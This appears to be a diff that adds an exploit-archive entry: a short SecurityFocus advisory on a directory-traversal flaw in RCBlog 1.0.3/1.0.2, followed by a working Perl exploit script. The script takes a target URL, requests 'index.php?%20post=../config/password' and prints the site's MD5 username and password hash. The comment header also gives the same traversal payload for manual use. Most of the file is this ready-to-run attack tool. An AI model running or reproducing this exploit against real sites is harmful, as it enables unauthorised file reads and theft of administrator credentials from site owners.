@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/16342/info
+
+RCBlog is prone to a directory-traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the webserver process. Information obtained may aid in further attacks.
+
+Version 1.0.3 is vulnerable; other versions may also be affected.
+
+#!/usr/bin/perl
+#
+# RCBlog 1.0.3 / 1.0.2
+# Exploit by Hessam-x (www.hessamx.net)
+# Name    : RCBlog (www.fluffington.com
+# version : 1.0.3 / 1.0.2
+# manual exploiting:
+# index.php?%20post=../config/password
+#
+use LWP::Simple;
+
+print "-------------------------------------------\n";
+print "=            RCBlog 1.0.3 / 1.0.2         =\n";
+print "=       By Hessam-x  - www.hackerz.ir     =\n";
+print "-------------------------------------------\n\n";
+
+
+        print "Target(http://www.example.com)\> ";
+        chomp($targ = <STDIN>);
+
+        print "Path: (/rcblog/)\>";
+        chomp($path=<STDIN>);
+
+$url = "index.php?%20post=../config/password";
+$page = get($targ.$path.$url) || die "[-] Unable to retrieve: $!";
+print "[+] Connected to: $targ\n";
+$page =~ m/<div class="title">(.*?)<\/div>/ && print "[+] MD5 [Username]   [Password]:\n $1\n";
+print "[-] Unable to retrieve User ID\n" if(!$1);
+
